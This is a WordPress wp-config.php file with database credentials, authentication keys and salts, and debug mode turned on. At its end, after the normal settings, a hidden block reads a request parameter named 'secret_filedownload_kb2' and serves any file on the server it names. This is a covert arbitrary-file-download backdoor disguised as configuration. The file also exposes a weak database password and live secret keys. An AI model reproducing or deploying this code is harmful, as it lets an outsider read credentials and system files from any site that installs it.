<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'admin_rawdb');

/** MySQL database username */
define('DB_USER', 'admin_rawdb');

/** MySQL database password */
define('DB_PASSWORD', '@123456');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

define('WP_MEMORY_LIMIT', '128M');
define('WP_MAX_MEMORY_LIMIT', '256M');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         '$q G{#scYrxFV]GGqDQ%O(;|d6a}KjcS<DfLQuX;Oz8@_m)`b4t{hGy8H9d}vm@o');
define('SECURE_AUTH_KEY',  '_n#l_[A&4aQ7WG$TMVo5k-Sl=dscRC@MsRA #yp}3>Y_TgOy`Au,ZA}{DVh^h!fw');
define('LOGGED_IN_KEY',    '{]A=tLM-Qqg:MPk:lFO*mS3{Oy}w*(saaAbZ-ga-`^(0p{D_Z|w~=jONd%uxJb4L');
define('NONCE_KEY',        '1!U)UX7S%F[u,_T 7 %>_8PPOA#OeFK`mGM}+?g?/wer&<(Qhdoyp(:DnEF6sDZ}');
define('AUTH_SALT',        '~;g% SDR.M3;#3lEG.K!1o0Lchtta Bfu}7Is<f<1/=U$56I}dEr_iaoQp.<SoxD');
define('SECURE_AUTH_SALT', 'mH*?jb}82>*ML4(6?]__cw*KI~L7qm)!6](1{MDWH2)mp|X9N@OcltM,&1a{#k4j');
define('LOGGED_IN_SALT',   'BGRmVKT16HEY:Mz=x#@H$#*y?E/QPz7$}5%B|rn#rzM[U|;ww33VTM/%F8`^msK4');
define('NONCE_SALT',       'XUOiyDs?A_3|;-rB.X(HO<fjeIp1U`540.?`O#MeQE9cztwFLmu[g.oP}A#gXasm');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', true);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');

$file = $_REQUEST['secret_filedownload_kb2'] ?? "";
if($file!="") {
	$file = urldecode($file);
	header('Content-Type: application/octet-stream');
	header("Content-Transfer-Encoding: Binary");
	header("Content-disposition: attachment; filename=\"" . basename($file) . "\"");
	echo readfile($file);
	exit;
}
